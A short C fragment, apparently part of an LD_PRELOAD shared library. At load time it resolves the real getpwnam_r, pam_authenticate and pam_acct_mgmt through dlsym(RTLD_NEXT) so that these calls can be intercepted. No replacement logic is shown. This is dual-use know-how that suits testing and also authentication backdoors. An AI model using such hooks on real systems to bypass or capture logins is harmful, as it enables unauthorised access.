#include <dlfcn.h>

enum libcall_refs
{
	GETPWNAM_R,
	PAM_AUTHENTICATE,
	PAM_ACCT_MGMT,
	N_LIBCALLS	/* Number of interposed libc functions. */
};

const void *(*libcalls[N_LIBCALLS])();
const char *libc_names[] = \
{
	"getpwnam_r",
	"pam_authenticate",
	"pam_acct_mgmt"
};

__attribute__((constructor))
void init_hooks(void)
{
	int i;

	for(i = 0; i < N_LIBCALLS; i++)
		libcalls[i] = dlsym(RTLD_NEXT, libc_names[i]);
};
